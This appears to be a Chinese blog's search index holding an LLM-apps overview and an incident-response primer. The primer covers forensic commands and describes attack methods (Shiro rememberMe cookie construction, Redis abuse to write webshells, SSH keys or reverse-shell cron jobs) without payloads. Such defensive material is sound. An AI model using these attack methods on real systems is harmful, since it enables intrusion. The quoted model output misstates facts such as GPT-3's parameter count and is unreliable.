<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>chatgpt及其大语言模型(LLM)应用</title>
    <link href="/2023/04/20/chatgpt%E5%8F%8A%E5%85%B6%E5%A4%A7%E8%AF%AD%E8%A8%80%E6%A8%A1%E5%9E%8B-LLM-%E5%BA%94%E7%94%A8/"/>
    <url>/2023/04/20/chatgpt%E5%8F%8A%E5%85%B6%E5%A4%A7%E8%AF%AD%E8%A8%80%E6%A8%A1%E5%9E%8B-LLM-%E5%BA%94%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h2 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h2><p>为了顺应时代浪潮（<del>怕被卷没了</del>），开始使用chatgpt这种大语言模型（LLM）应用了，体验了Chatgpt、谷歌Bard、Claude等国外的LLM应用，主要国内也没获取到相关应用到内测资格 hhh</p><p>其中Chatgpt 和 Claude 算是目前本人的主力使用，对中文也很友好，而且能解决代码开发中的效率问题，妥妥生产力！</p><h2 id="2-大语言模型（LLM）"><a href="#2-大语言模型（LLM）" class="headerlink" title="2. 大语言模型（LLM）"></a>2. 大语言模型（LLM）</h2><p>什么是大语言模型？</p><blockquote><p>大语言模型（LLM）是指能够学习和预测人类自然语言的模型，它使用大规模的文本数据来模拟语言的结构和语法规则。LLM通常使用深度学习算法（如循环神经网络，长短时记忆网络等）来提高预测的准确性，并在自然语言处理任务中取得了很好的效果，如自动问答、机器翻译、文本摘要、语音识别等。大型语言模型在机器学习领域拥有广泛的应用，对人工智能发展有很大的推动作用。</p></blockquote><p>———以上来自 Chatgpt 3.5</p><blockquote><p>大语言模型(Large Language Model,简称LLM)是一类使用神经网络训练的大规模语言模型。它们通常包含数十亿个参数,可以学习无监督的大量文本数据,并生成自然语言。目前较知名的LLM有:</p><ol><li>GPT-3:开放AI旗下的模型,包含175亿个参数,可以生成文本、翻译语言、回答问题等。</li><li>BERT:Google开发的语言表示模型,用于自然语言处理任务,包含110M个参数。</li><li>XLNet:谷歌开发的语言模型,包含110M个参数,在多个自然语言处理任务上超过BERT。</li><li>T5:谷歌开发的文本到文本模型,可以用于生成文本和回答问题,包含11B个参数。</li><li>CTRL:Salesforce开发的语言模型,包含13B个参数,可以生成长篇小说和婚礼誓词等长篇文本。</li></ol><p>LLM的主要特征有:</p><ol><li><p>规模巨大:通常包含几十亿个参数,可以学习海量的数据集。</p></li><li><p>无监督学习:不需要人工标注的数据,可以学习一整个维基百科的数据集。</p></li><li><p>多功能:一个模型可以适用于多种自然语言处理任务,如生成文本、翻译、问答、文本摘要等。</p></li><li><p>超过人类表现:在某些任务上已经超过平均人类表现,如阅读理解。</p><p>目前, LLM仍面临生成的文本安全性、健壮性不足的问题。但未来,随着计算资源的增加和模型的进一步提高,LLM有望在更多语言技术场景中发挥重要作用。总之,大语言模型利用深度神经网络和大数据推动了自然语言处理技术的进步,值得我们持续关注。</p></li></ol></blockquote><p>———以上来自Claude</p><h2 id="3-LLM的应用"><a href="#3-LLM的应用" class="headerlink" title="3. LLM的应用"></a>3. LLM的应用</h2><h3 id="3-1-Chatgpt-（🌟🌟🌟🌟🌟）"><a href="#3-1-Chatgpt-（🌟🌟🌟🌟🌟）" class="headerlink" title="3.1 Chatgpt （🌟🌟🌟🌟🌟）"></a>3.1 Chatgpt （🌟🌟🌟🌟🌟）</h3><p>官网：</p><p><a href="https://chat.openai.com/">https://chat.openai.com</a></p><p><img src="/../img/chatgpt%E5%8F%8A%E5%85%B6%E5%A4%A7%E8%AF%AD%E8%A8%80%E6%A8%A1%E5%9E%8B-LLM-%E5%BA%94%E7%94%A8/chatgpt.png" alt="chatgpt"></p><p>至于怎么注册，网上很多了，这里就不赘述</p><h3 id="3-2-Claude-（🌟🌟🌟🌟）"><a href="#3-2-Claude-（🌟🌟🌟🌟）" class="headerlink" title="3.2 Claude （🌟🌟🌟🌟）"></a>3.2 Claude （🌟🌟🌟🌟）</h3><p>“<a href="http://mp.weixin.qq.com/s?__biz=MzIzNjc1NzUzMw==&mid=2247663551&idx=1&sn=0b4d22152423c3977c0e81c19d7a2f32&chksm=e8dec8cddfa941db19bb816db380491ae809762479b77f6f4bb037ffb6396900fc26413c1ace&scene=21#wechat_redirect">ChatGPT最强竞品</a>”，Claude</p><p><img src="/../img/chatgpt%E5%8F%8A%E5%85%B6%E5%A4%A7%E8%AF%AD%E8%A8%80%E6%A8%A1%E5%9E%8B-LLM-%E5%BA%94%E7%94%A8/640.png" alt="Claude"></p><p>官网：<a href="https://www.anthropic.com/claude-in-slack">https://www.anthropic.com/claude-in-slack</a></p><p> 具体测评可看<a href="https://mp.weixin.qq.com/s/QB85YPjh6DMBTPla4NDfXg">量子位</a>的文章，本文也不多赘述</p><p>放一张使用截图</p><p><img src="/../img/chatgpt%E5%8F%8A%E5%85%B6%E5%A4%A7%E8%AF%AD%E8%A8%80%E6%A8%A1%E5%9E%8B-LLM-%E5%BA%94%E7%94%A8/image-20230420235742231.png" alt="Claude"></p><h3 id="3-3-Bard-（🌟🌟）"><a href="#3-3-Bard-（🌟🌟）" class="headerlink" title="3.3 Bard （🌟🌟）"></a>3.3 Bard （🌟🌟）</h3><p>官网：<a href="https://bard.google.com/">https://bard.google.com</a></p><p>对中文不优化，不咋推荐。</p><p><img src="/../img/chatgpt%E5%8F%8A%E5%85%B6%E5%A4%A7%E8%AF%AD%E8%A8%80%E6%A8%A1%E5%9E%8B-LLM-%E5%BA%94%E7%94%A8/image-20230421000024812.png" alt="Bard"></p><h2 id="4-依靠chatgpt开发的应用"><a href="#4-依靠chatgpt开发的应用" class="headerlink" title="4. 依靠chatgpt开发的应用"></a>4. 依靠chatgpt开发的应用</h2><h3 id="4-1-chatgpt-vercel"><a href="#4-1-chatgpt-vercel" class="headerlink" title="4.1 chatgpt-vercel"></a>4.1 <strong>chatgpt-vercel</strong></h3><p>开源的项目，基于 <a href="https://github.com/ddiu8081/chatgpt-demo">chatgpt-demo</a> 开发，可以用<a href="https://vercel.com/">vercel</a>一键搭建一个，绑定域名灵活使用。</p><p>目前本人也搭建了一个，随手用。不定时更新内置key，</p><p>链接：<a href="https://www.mochazz.cloud/">https://www.mochazz.cloud/</a></p><p><img src="/../img/chatgpt%E5%8F%8A%E5%85%B6%E5%A4%A7%E8%AF%AD%E8%A8%80%E6%A8%A1%E5%9E%8B-LLM-%E5%BA%94%E7%94%A8/image-20230421001329154.png" alt="chatgpt-vercel"></p><h3 id="4-2-ChuanhuChatGPT"><a href="#4-2-ChuanhuChatGPT" class="headerlink" title="4.2 ChuanhuChatGPT"></a>4.2 ChuanhuChatGPT</h3><p>另外一个比较优质的开源项目</p><p>为ChatGPT&#x2F;ChatGLM&#x2F;LLaMA等多种LLM提供了一个轻快好用的Web图形界面，也支持一件部署到huggingface上面。</p><p>github地址： <a href="https://github.com/GaiZhenbiao/ChuanhuChatGPT">https://github.com/GaiZhenbiao/ChuanhuChatGPT</a></p><p><img src="/../img/chatgpt%E5%8F%8A%E5%85%B6%E5%A4%A7%E8%AF%AD%E8%A8%80%E6%A8%A1%E5%9E%8B-LLM-%E5%BA%94%E7%94%A8/image-20230421001747239.png" alt="ChuanhuChatGPT"></p><h3 id="4-3-Feishu-OpenAI"><a href="#4-3-Feishu-OpenAI" class="headerlink" title="4.3 Feishu-OpenAI"></a>4.3 Feishu-OpenAI</h3><p>项目地址：<a href="https://github.com/ConnectAI-E/Feishu-OpenAI">https://github.com/ConnectAI-E/Feishu-OpenAI</a></p><p>作者为 Connect-AI-E， 机器人功能又多又nice！让工作效率起飞！除了飞书以外的，还有钉钉的chatgpt机器人。具体可看项目。</p><p>项目特点：</p><ul><li>🍏 对话基于 OpenAI-<a href="https://platform.openai.com/account/api-keys">gpt-3.5-turbo</a> 接口</li><li>🍎 通过 lark，将 ChatGPT 接入<a href="https://open.feishu.cn/app">飞书</a>和<a href="https://www.larksuite.com/">飞书国际版</a></li><li>🥒 支持<a href="https://github.com/serverless-devs/serverless-devs">Serverless 云函数</a>、<a href="https://dashboard.cpolar.com/login">本地环境</a>、<a href="https://www.docker.com/">Docker</a>、<a href="https://github.com/Leizhenpeng/feishu-chatgpt/releases/">二进制安装包</a> 等多种渠道部署</li><li>🍋 基于<a href="https://github.com/patrickmn/go-cache">goCache</a>内存键值对缓存</li></ul><p>项目部署的方式也很多</p><p><img src="/../img/chatgpt%E5%8F%8A%E5%85%B6%E5%A4%A7%E8%AF%AD%E8%A8%80%E6%A8%A1%E5%9E%8B-LLM-%E5%BA%94%E7%94%A8/image-20230421002244049.png" alt="项目部署"></p><h2 id="5-后续"><a href="#5-后续" class="headerlink" title="5. 后续"></a>5. 后续</h2><p>后续会不定期更新一些非常不错的AI相关的应用，以及chatgpt相关插件、AIGC相关的内容。</p><h2 id="6-参考链接"><a href="#6-参考链接" class="headerlink" title="6. 参考链接"></a>6. 参考链接</h2><ol><li><a href="https://chat.openai.com/">https://chat.openai.com</a></li><li><a href="https://mp.weixin.qq.com/s/QB85YPjh6DMBTPla4NDfXg">https://mp.weixin.qq.com/s/QB85YPjh6DMBTPla4NDfXg</a></li><li><a href="https://www.anthropic.com/claude-in-slack">https://www.anthropic.com/claude-in-slack</a></li><li><a href="https://vercel.com/">https://vercel.com/</a></li><li><a href="https://huggingface.co/">https://huggingface.co</a></li><li><a href="https://github.com/ConnectAI-E/Feishu-OpenAI">https://github.com/ConnectAI-E/Feishu-OpenAI</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>杂谈</category>
      
    </categories>
    
    
    <tags>
      
      <tag>chatgpt LLM</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ChatGPT Vercel</title>
    <link href="/2023/04/20/AI%E4%B9%8BChatGPT%E5%8F%8A%E5%85%B6%E5%B9%B3%E6%9B%BF%E7%89%A9/"/>
    <url>/2023/04/20/AI%E4%B9%8BChatGPT%E5%8F%8A%E5%85%B6%E5%B9%B3%E6%9B%BF%E7%89%A9/</url>
    
    <content type="html"><![CDATA[<h2 id="ChatGPT-Vercel"><a href="#ChatGPT-Vercel" class="headerlink" title="ChatGPT-Vercel"></a>ChatGPT-Vercel</h2><p>项目地址：</p><p><a href="https://github.com/ourongxing/chatgpt-vercel">https://github.com/ourongxing/chatgpt-vercel</a></p><p>为了不被AI时代淘汰（<del>拍死在沙滩上</del>），也学习了下chatgpt等AI的衍生</p>]]></content>
    
    
    <categories>
      
      <category>AI</category>
      
    </categories>
    
    
    <tags>
      
      <tag>chatgpt</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>应急响应初探</title>
    <link href="/2023/04/20/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%88%9D%E6%8E%A2/"/>
    <url>/2023/04/20/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%88%9D%E6%8E%A2/</url>
    
    <content type="html"><![CDATA[<h2 id="常用方法"><a href="#常用方法" class="headerlink" title="常用方法"></a><strong>常用方法</strong></h2><ul><li>三要素法：时间、地点、事件</li><li>回溯攻击法：尝试模拟攻击</li><li>经验法：<ul><li>攻击者常用的目录</li><li>黑客惯用手法</li><li>常见恶意程序特征</li></ul></li></ul><h2 id="应急响应阶段"><a href="#应急响应阶段" class="headerlink" title="应急响应阶段"></a>应急响应阶段</h2><p>检测阶段→抑制阶段→根除阶段→恢复阶段→溯源阶段</p><h2 id="应急排查点"><a href="#应急排查点" class="headerlink" title="应急排查点"></a>应急排查点</h2><p><img src="/../img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%88%9D%E6%8E%A2/1.png" alt="应急排查点"></p><h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a><strong>Windows</strong></h2><h3 id="登录记录"><a href="#登录记录" class="headerlink" title="登录记录"></a>登录记录</h3><ol><li>命令输入: gpedit.msc  </li><li>“计算机配置”→“Windows设置”→“安全设置”→“本地策略”→“审核策略”，双击其中的“审核帐户登陆事件”&#x3D;&#x3D;&gt;审核登录事件–&gt;勾上成功&#x2F;失败–&gt;点击应用–&gt;点击确定</li><li>控制面板–&gt;系统和安全–&gt;查看事件日志–&gt;事件查看器–&gt;windows日志–&gt;安全，便可以看到用户的登录和注销以及账户名等信息</li></ol><h3 id="系统信息"><a href="#系统信息" class="headerlink" title="系统信息"></a>系统信息</h3><ul><li>基本信息：</li></ul><p>msinfo32、systeminfo</p><ul><li>启动项：</li></ul><ol><li>msconfig</li><li>注册表：Run键值、RunOnce键值、RunServicesOnce健值、RunServices健值、RunOneceEx键值（windows xp&#x2F;2003特有）、load健值、Winlogon健值<ol><li>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users</li></ol></li></ol><ul><li>计划任务：<ol><li>compmgmt.msc（计算机管理）下计划任务</li><li>Powershell使用Get-ScheduledTask</li><li>schtasks命令</li></ol></li></ul><h3 id="文件痕迹排查"><a href="#文件痕迹排查" class="headerlink" title="文件痕迹排查"></a>文件痕迹排查</h3><ul><li>敏感目录<ul><li>%WINDIR%</li><li>%WINDIR%\system32\</li><li>%TEMP%</li><li>%LOCALAPPDATA%</li><li>%APPDATA% </li><li>各个盘下的temp（tmp）相关目录下查看有无异常文件</li></ul></li><li>特定时间段的文件情况排查<ul><li>查看文件时间，创建时间，修改的时间，访问时间</li><li>对应的linuxd的ctime,mtime,atime</li><li>查看用户的recent相关文件，通过分析最近打开分析可疑文件<ul><li>C:\Documents and Settings\Administrator\Recent</li><li>C:\Documents and Settings\Default User\Recent</li><li>开始，运行 %UserProfile%\Recent</li></ul></li><li>根据文件夹内文件列表时间进行排序，查找可疑文件。也可以搜索指定时间范围内的文件和文件夹</li></ul></li><li>后门文件的排查</li></ul><h3 id="进程排查"><a href="#进程排查" class="headerlink" title="进程排查"></a>进程排查</h3><ul><li>通过任务管理器进行查看<ul><li>映像路径名称</li><li>命令行</li></ul></li><li>tasklist命令<ul><li>tasklist &#x2F;svc    可以显示每个进程和服务的对应情况</li><li>对于某些加载dll的恶意进程，可以通过&#x2F;m参数进行查询。对于要查询特定dll的调用情况，可以使用命令tasklist  &#x2F;m dll 名称</li></ul></li></ul><p><img src="/../img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%88%9D%E6%8E%A2/2.png" alt="tasklist命令"></p><ul><li>netstat命令<ul><li>在排查过程中，一般会使用netstat -ano | findstr “ESTABLISHED” 查看目前的网络连接，定位可疑的ESTABLISHED。根据netstat 定位出的pid，再通过tasklist命令进行程序定位</li></ul></li><li>powershell命令<ul><li>Get-WmiObject Win32_Process | select Name,ProcessId,ParentProcessId,Path</li></ul></li><li>wmic命令进行查询<ul><li>wmic process where name&#x3D;’powershell.exe’ get caption,commadnline,processid,parentprocessid &#x2F;value</li></ul></li></ul><h3 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h3><ol><li>通过内置的日志筛选器进行分析，可以通过事件ID，关键字等对日志进行筛选</li><li>通过Powershell对日志进行分析<ol><li>通过powershell进行查询最常用到两个命令是Get-EventLog和Get-WinEvent，两者的区别是GetEventLog只获取传统的事件日志，而Get-WinEvent cmdlet 从包括传统日志（例如系统日志和应用程序日志）在内的事件日志和 Windows Vista 中引入的新 Windows 事件日志技术生成的事件日志中获取事件。</li></ol></li><li>通过相关的日志工具进行分析查询</li></ol><ul><li>主机日志<ul><li>应用程序</li><li>安全性</li><li>系统</li></ul></li><li>其他日志<ul><li>IIS日志</li><li>Apache日志</li><li>Tomcat日志</li></ul></li></ul><h2 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h2><h3 id="查看用户相关分析"><a href="#查看用户相关分析" class="headerlink" title="查看用户相关分析"></a>查看用户相关分析</h3><pre><code class="hljs">  1. useradd userdel 的命令时间变化（stat），以及是否包含可疑信息  2. cat /etc/passwd 分析可以账号，可登录账号</code></pre><h3 id="系统信息-1"><a href="#系统信息-1" class="headerlink" title="系统信息"></a>系统信息</h3><h4 id="查看分析history"><a href="#查看分析history" class="headerlink" title="查看分析history"></a>查看分析history</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /root/.bash_history<br></code></pre></td></tr></table></figure><pre><code class="hljs">  1. wget远程某主机（域名&amp;IP）的远控文件；  2. 尝试连接内网某主机（ssh scp），便于分析攻击者意图  3. 打包某敏感数据或代码，tar zip 类命令  4. 对系统进行配置，包含命令修改、远控木马类，可找到攻击者关联信息</code></pre><h4 id="启动项"><a href="#启动项" class="headerlink" title="启动项"></a>启动项</h4><p>启动项作为恶意病毒的一个常用的驻留手段，以下几个地方可以查找启动项相关的内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">/etc/init.d/rc.local<br>/etc/rc.local<br>rc.local<br>/etc/init.d<br></code></pre></td></tr></table></figure><h4 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h4><ul><li>通过crontab -l 查看当前的任务计划有哪些，也可以指定用户进行查看<ul><li>crontab -u root -l 是root下的计划任务</li></ul></li><li>查看etc目录任务计划相关文件，一般存在计划任务的目录有以下，可以通过浏览下面的计划任务文件的方式来查看计划任务</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span> /etc/cron*<br>crontab -l<br></code></pre></td></tr></table></figure><h4 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h4><p>使用netstat 网络连接命令，分析可疑端口、可疑IP、可疑PID及程序进程</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">netstat -antlp | more<br></code></pre></td></tr></table></figure><p>如下图所示，为某恶意程序的外链信息。然后根据pid，利用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span> –alh /proc/pid<br></code></pre></td></tr></table></figure><p>命令查看其对应的可执行程序<br><img src="/../img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%88%9D%E6%8E%A2/3.png" alt="ls –alh /proc/pid"><br>也可以利用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">lsof –p pid<br></code></pre></td></tr></table></figure><p>查看pid对应的可执行程序,如果是恶意进程，可以使用kill -9（数字九） 进程的PID值命令来结束进程，如kill -9 2535，然后使用 rm -rf filename 来删除木马，如果root用户都无法删除相关文件，很可能文件被加上了i属性，使用 lsatter filename 命令来查看文件属性，然后使用chattr -i filename 命令来移除i属性继而删除文件；也有的进程因为存在守护进程而无法杀除，可以先把进程挂起，再杀掉守护进程后，再回来把进程杀掉。</p><h4 id="文件痕迹排查-1"><a href="#文件痕迹排查-1" class="headerlink" title="文件痕迹排查"></a>文件痕迹排查</h4><ul><li>时间点</li></ul><p>find: 在指定目录下查找文件<br>-type b&#x2F;d&#x2F;c&#x2F;p&#x2F;l&#x2F;f 查找是块设备、目录、字符设备、管道、符号链接、普通文件<br>-mtime -n +n 按文件更改时间来查找文件，-n 指 n天以内，+n 指 n 天前<br>-atime -n +n 按文件访问时间来查找文件，-n 指n 天以内，+n 指 n天前<br>-ctime -n +n 按文件创建时间来查找文件， -n指n天以内，+n指n天前<br>find &#x2F; -ctime 0 -name “*.sh”</p><ul><li>特殊文件</li></ul><p>查找777的权限文件 find &#x2F; *.jsp -perm 777<br>webshell<br><img src="/../img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%88%9D%E6%8E%A2/4.png" alt="webshell"><br>查看目标系统命令的修改时间：ls -alt &#x2F;bin</p><h4 id="日志分析-1"><a href="#日志分析-1" class="headerlink" title="日志分析"></a>日志分析</h4><p><strong>var&#x2F;log下的具体功能</strong></p><ul><li>&#x2F;var&#x2F;log&#x2F;wtmp 登录进入，退出，数据交换、关机和重启记录</li><li>&#x2F;var&#x2F;log&#x2F;lastlog 文件记录用户最后登录的信息</li><li>&#x2F;var&#x2F;log&#x2F;secure 记录登入系统存取数据的文件，如 pop3&#x2F;ssh&#x2F;telnet&#x2F;ftp</li><li>&#x2F;var&#x2F;log&#x2F;cron 与定时任务相关的日志信息，记录crontab命令是否被正确的执行</li><li>&#x2F;var&#x2F;log&#x2F;message 系统启动后的信息和错误日志</li><li>&#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log apache的访问日志</li><li>&#x2F;var&#x2F;log&#x2F;auth.log 包含系统授权信息，包括用户登录和使用的权限机制等</li><li>&#x2F;val&#x2F;log&#x2F;userlog 记录所有登记用户的信息日志</li><li>&#x2F;var&#x2F;log&#x2F;xferlog(vsftp.log)记录linux FTP日志</li><li>&#x2F;var&#x2F;log&#x2F;history 用户登录时间IP为名字的文件, 内容为用户执行命令的日志信息</li><li>&#x2F;var&#x2F;log&#x2F;faillog 记录登录系统不成功的账号信息</li></ul><p><strong>另外</strong></p><pre><code class="hljs">  - last 为登陆成功日志  - lastb为登录失败，可查看是否爆破  - stat 查看日志创建时间  - 如果怀疑某个文件为木马控制端，可直接对文件进行调试查看传递信息</code></pre><p>strace -p pid #调试进程</p><pre><code class="hljs">  - history 或 cat ~/.bash_history 查看历史命令，查找痕迹</code></pre><p><strong>入侵者可能会删除机器的日志信息，可以查看日志信息是否还存在或者是否被清空，相关命令示例：</strong><br>root@ahuan:~# ll -h &#x2F;var&#x2F;log&#x2F;*<br>-rw-r–r–  1 root      root               0 Mar  1 06:25 &#x2F;var&#x2F;log&#x2F;alternatives.log<br>-rw-r–r–  1 root      root             283 Feb 25 09:57 &#x2F;var&#x2F;log&#x2F;alternatives.log.1<br>-rw-r–r–  1 root      root             214 Feb 18 11:57 &#x2F;var&#x2F;log&#x2F;alternatives.log.2.gz<br>-rw-r–r–  1 root      root             477 Dec 20 23:29 &#x2F;var&#x2F;log&#x2F;alternatives.log.3.gz<br>-rw-r–r–  1 root      root            2.0K Nov 30 22:56 &#x2F;var&#x2F;log&#x2F;alternatives.log.4.gz</p><h4 id="恶意流量"><a href="#恶意流量" class="headerlink" title="恶意流量"></a>恶意流量</h4><p>netstat -anlpt 查看是否存在恶意流量（通过威胁情报进行判定是否为恶意域名）<br>查找对应流量连接位置<br>ls -al &#x2F;proc&#x2F;PID (根据查到pid进程输入)</p><p>如 ls -al &#x2F;proc&#x2F;791<br>exe -&gt; 指向启动当前进程的可执行文件（完整路径）的符号链接</p><h2 id="web漏洞应急篇"><a href="#web漏洞应急篇" class="headerlink" title="web漏洞应急篇"></a>web漏洞应急篇</h2><h2 id="Apache-Shiro攻击"><a href="#Apache-Shiro攻击" class="headerlink" title="Apache Shiro攻击"></a>Apache Shiro攻击</h2><p>特征rememberMe<br>恶意 Cookie rememberMe值构造<br>前16字节的密钥 -&gt; 后面加入序列化参数 -&gt; AES加密 -&gt; base64编码 -&gt; 发送cookie</p><p>Apache Shiro处理cookie的流程<br>得到rememberMe的cookie值 -&gt; Base64解码 -&gt; AES-128-CBC解密-&gt; 反序列化(readobject)</p><p><strong>应急流程</strong><br>设备查看告警信息，对remeberMe进行解密，查看反弹IP&#x2F;域名进行进一步溯源，<br>reneberMe管理代码中写道cookie加密密钥默认为AES算法，可以将黑客常用的攻击密钥做一个keylist进行解密，直接在解密内容里查看payload。</p><p>排查思路，该漏洞都是通过remeberMe进行传入payload，直接对日志shiro进行反编译即可查到相关信息（vps、未公开的利用链，特殊的payload）</p><h2 id="Weblogic攻击"><a href="#Weblogic攻击" class="headerlink" title="Weblogic攻击"></a>Weblogic攻击</h2><p>流量层：可以直接查看到访问地址数据包内payload<br>如CVE-2020-2551(iiop)漏洞主要是通过 JtaTransactionManager 来进行加载 LDAP 协议的内容<br><strong>在日志里显示：</strong><br>Weblogic日志主要分为：Server日志、HTTP日志和DOMAIN日志；</p><p>1、Server日志<br>主要功能：记录Weblogic Server启动至关闭过程中的运行信息和错误信息。<br>日志结构：时间戳、严重程度、子系统、计算机名、服务器名、线程 ID、用户 ID、事务 ID、诊断上下文 ID、原始时间值、消息 ID 和消息文本。<br>2、DOMAIN日志<br>主要功能：记录一个DOMAIN下的各个Weblogic Server的启动至关闭过程中的运行信息和错误信息。<br>日志结构：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">####<span class="hljs-tag">&lt;<span class="hljs-name">Oct</span> <span class="hljs-attr">18</span>, <span class="hljs-attr">2018</span> <span class="hljs-attr">2:21:11</span> <span class="hljs-attr">PM</span> <span class="hljs-attr">CST</span>&gt;</span>     &lt;[ACTIVE]ExecuteThread: &#x27;9&#x27; for queue: &#x27;weblogic.kernel.Default (self-tuning)&#x27;&gt; <span class="hljs-tag">&lt;&gt;</span> <span class="hljs-tag">&lt;&gt;</span> <span class="hljs-tag">&lt;&gt;</span> &lt;1539843671288&gt;  <br></code></pre></td></tr></table></figure><p>iiop协议不会在http请求中有记录，应急主要注意domain日志的记录</p><p>应急流程：<br><strong>t3协议</strong><br>临时处置方式：<br>1.及时更新补丁<br>2.禁用T3协议<br>3.禁止T3端口对外开放, 或者限制可访问T3端口的IP来源<br>漏洞列表：<br>CVE-2017-3248<br>CVE-2018-2628<br>CVE-2018-2893<br>CVE-2019-2890<br>CVE-2020-2555<br><strong>iiop协议</strong><br>临时处置：<br>1.及时更新补丁<br>2.通过 Weblogic 控制台进行关闭 IIOP 协议<br>漏洞列表：<br>CVE-2020-2551</p><h2 id="Redis未授权"><a href="#Redis未授权" class="headerlink" title="Redis未授权"></a>Redis未授权</h2><p>1.写webshell<br>2.写ssh密钥<br>3.写计划任务反弹shell</p><h3 id="应急流程："><a href="#应急流程：" class="headerlink" title="应急流程："></a>应急流程：</h3><p>查看配置信息是否存在异常（根据显示信息可判断是哪种攻击方式）<br>config get *<br><img src="/../img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%88%9D%E6%8E%A2/5.png" alt="config get *"><br>写ssh密钥<br><img src="/../img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%88%9D%E6%8E%A2/6.png" alt="写ssh密钥"><br>反弹shell<br><img src="/../img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%88%9D%E6%8E%A2/7.png" alt="反弹shell"><br>写文件路径<br>查看key信息是否有攻击队特征信息<br><img src="/../img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%88%9D%E6%8E%A2/8.png" alt="查看key信息是否有攻击队特征信息"><br>如果发现攻击队正在操作redis，可以使用 monitor命令进行检测<br><img src="/../img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%88%9D%E6%8E%A2/8.png" alt="monitor命令进行检测"></p><h2 id="冰蝎与内存马攻击"><a href="#冰蝎与内存马攻击" class="headerlink" title="冰蝎与内存马攻击"></a>冰蝎与内存马攻击</h2><ul><li>冰蝎</li></ul><p>特征：后缀为动态脚本（jsp、asp、php） 请求体加密状态</p><ul><li>内存马</li></ul><p>攻击特征：没有落地文件通常以 <a href="http://url.com/xxx/">http://url.com/xxx/</a> (直接以某个文件夹为路径)<br><img src="/../img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%88%9D%E6%8E%A2/10.png" alt="内存马"><br><strong>应急思路</strong><br>针对webshell，可直接对web路径下查找动态脚本文件，也可以直接搜索文件内特征值<br><img src="/../img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%88%9D%E6%8E%A2/11.png" alt="find / -name *.jsp*"></p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">find</span> / -name *.jsp | xargs <span class="hljs-keyword">grep</span> <span class="hljs-string">&quot;pass&quot;</span><br></code></pre></td></tr></table></figure><p>（pass为特征值，可以修改。如果返回内容过多可自行修改特征）</p><p><img src="/../img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%88%9D%E6%8E%A2/12.png" alt="pass特征"><br>对于内存马，虽然现在有各种文章分析如何提取，但最简单的方法还是重启解决问题。<br>如果想知道如何手动清理，请移步至：<br><a href="https://mp.weixin.qq.com/s?__biz=MzIwMDk1MjMyMg==&mid=2247485680&idx=1&sn=bbd2bd94da7720c6567c462c8559cfdd&scene=21#wechat_redirect">https://mp.weixin.qq.com/s/DRbGeVOcJ8m9xo7Gin45kQ</a><br>修复建议：<br>1.根据漏洞来定，如果是程序漏洞修复即可<br>2.上传漏洞，禁止上传动态脚本文件，采用白名单机制仅允许特定后缀上传</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol><li><a href="https://mp.weixin.qq.com/s/DRbGeVOcJ8m9xo7Gin45kQ">https://mp.weixin.qq.com/s/DRbGeVOcJ8m9xo7Gin45kQ</a></li><li><a href="https://mp.weixin.qq.com/s/w3c7tKfj1Plcbv57Gz8M0g">https://mp.weixin.qq.com/s/w3c7tKfj1Plcbv57Gz8M0g</a></li><li><a href="https://mp.weixin.qq.com/s/f38CmhZCXPvz5P-c17z-Bw">https://mp.weixin.qq.com/s/f38CmhZCXPvz5P-c17z-Bw</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>应急响应</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Redis未授权访问初探</title>
